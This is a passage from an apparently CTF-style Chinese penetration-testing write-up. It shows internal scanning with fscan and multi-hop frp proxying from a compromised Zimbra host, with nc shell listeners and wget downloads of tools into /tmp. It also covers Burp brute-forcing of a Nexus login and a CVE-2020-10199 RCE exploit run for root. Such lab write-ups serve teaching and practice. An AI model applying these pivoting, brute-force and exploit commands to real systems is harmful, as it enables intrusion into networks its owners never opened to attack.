`printf("hello world!");nc -lvvp 8888``/tmp/exp1``wget --no-check-certificate -P /tmp https://192.168.20.130:7071/zimbraAdmin/fscan_amd64`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

运行fscan来扫描192.168.30.0/24这个内网

  

```
`chmod +x fscan_amd64``./fscan_amd64 -h 192.168.30.0/24`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里扫描出一台主机：192.168.30.138，开放了8081端口。看200返回的信息好像是一个nexus repository manager，因为这台主机在二层内网中，所以后面操作需要使用之前的frp来搭建一个socks代理。

  

**frp多层代理**

将frp服务端和客户端都上传到外网主机中

```
scp frpc frpc.ini frps frps.ini root@10.30.1.88:/opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/zimbraAdmin
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

外网主机编辑frps.ini文件，后台启一个服务端

```
`vim frps.ini``nohup ./frps -c frps.ini &`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

杀掉之前frpc的进程，重新修改frpc.ini配置，然后后台运行

```
`ps aux |grep frpc``kill 13118``vim frpc.ini``nohup ./frpc -c frpc.ini >frpc.log 2>&1 &`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

继续执行nc监听来接受shell，然后下载刚刚上传的frpc做为客户端去连接外网主机开启的服务端

```
`nc -lvvp 8888``cd /tmp``./exp1``wget --no-check-certificate -P /tmp https://192.168.20.130:7071/zimbraAdmin/frpc``wget --no-check-certificate -P /tmp https://192.168.20.130:7071/zimbraAdmin/frpc.ini`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

但是这个shell好像没办法编辑。。。所以在外网主机中编辑好了然后重新下载吧

```
`cp frpc.ini frpc.ini.1``vim frpc.ini.1`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回到nc监听的shell中重新下载

```
`nc -lvvp 8888``cd tmp``./exp1``wget --no-check-certificate -P /tmp https://192.168.20.130:7071/zimbraAdmin/frpc.ini.1`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

开启frpc客户端，去连接做为服务端的外网主机

```
`cd /tmp``chmod +x frpc``nohup ./frpc -c frpc.ini.1 >frpc.log 2>&1 &`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**nexus resository mananger**

使用代理访问192.168.30.138:8081

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在左上角这里看到了版本号：3.21.0-05，搜索该服务找到相关漏洞：CVE-2020-10199（Nexus <= 3.21.1 远程代码执行）。但是利用这个漏洞需要账号密码，根据一层内网主机中的提示：admin/top1000.txt。可能账号是admin，密码是top1000中的其中一个？所以这里需要使用burp来爆破一下密码。

  

**burp设置代理爆破**

因为之前用的是kali自带的burp，爆破的话线程不能调，所以这里我切换到了破解版的。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

修改一下burp的几处设置，不然抓不到内网的包。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

设置完成后打开浏览器的插件使用burp的代理就可以抓到内网的数据包了。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

点击页面中的Sign in登录按钮输入用户名和密码，然后把抓到的包发送到爆破模块中来爆破密码字段。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里发现用户名和密码好像base64编码了。

  

加载top1000的字典，然后设置payload设置为base64编码，再把线程改大一点。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

点击开始爆破，速度好像有点慢，耐心等待一会吧。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

经过漫长的等待，终于爆破出密码了。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

解码后明文：abcdef

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**CVE-2020-10199 Nexus远程代码执行**

使用爆破出的密码成功登录页面

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用socks代理来运行攻击脚本，这里我使用的是这个：https://github.com/zhzyker/CVE-2020-10199_POC-EXP

```
proxychains4 python cve-2020-10199_cmd.py http://192.168.30.138:8081 admin abcdef
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功获取到权限，并且是root的权限了。

  

flag一开始没找到，后来加了个通配符才找到最终flag。。。。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)